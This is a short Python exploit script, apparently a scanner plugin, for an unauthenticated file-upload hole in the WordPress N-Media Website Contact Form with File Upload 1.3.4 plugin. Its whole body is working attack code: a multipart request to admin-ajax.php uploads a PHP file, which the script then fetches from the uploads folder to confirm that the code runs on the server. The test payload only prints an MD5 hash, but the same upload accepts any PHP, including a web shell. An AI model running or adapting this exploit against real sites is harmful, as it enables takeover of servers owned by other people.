#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:DWBH
#Exploit Title : Wordpress N-Media Website Contact Form with File Upload 1.3.4
import sys
import re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    uploader=''
    payload='/wp-admin/admin-ajax.php' 
    uploaderdir_url = 'wp-content/uploads/contact_files/' 
    data = ''

    data += "------WebKitFormBoundaryoWXEZaqFafD1oOAq\r\n"
    data += "Content-Disposition: form-data; name=\"Filedata\"; filename=\"1.php\"\r\n"
    data += "Content-Type: application/octet-stream\r\n\r\n"
    data += "<?php echo md5(1)?>\n"
    data += "------WebKitFormBoundaryoWXEZaqFafD1oOAq\r\n"
    data += "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
    data += "nm_webcontact_upload_file\r\n"
    data += "------WebKitFormBoundaryoWXEZaqFafD1oOAq\r\n"
    header = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoWXEZaqFafD1oOAq"

    uploader_url = arg + payload
    code, head, res, _, _ = curl.curl('-H \'%s\' -d \'%s\' %s' % (header, data, uploader_url))
    if code == 200:
        uploader=re.search(r'([\d]+)(\-)(1.php)', res)
    if uploader:
        bockdoor_url = arg + uploaderdir_url + uploader.group(0)
        code, head, res1, _, _ = curl.curl('%s' % (bockdoor_url))
        if code == 200 and ('c4ca4238a0b923820dcc509a6f75849b'in res1):
            security_hole(bockdoor_url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://192.168.0.118/wordpress/')[1])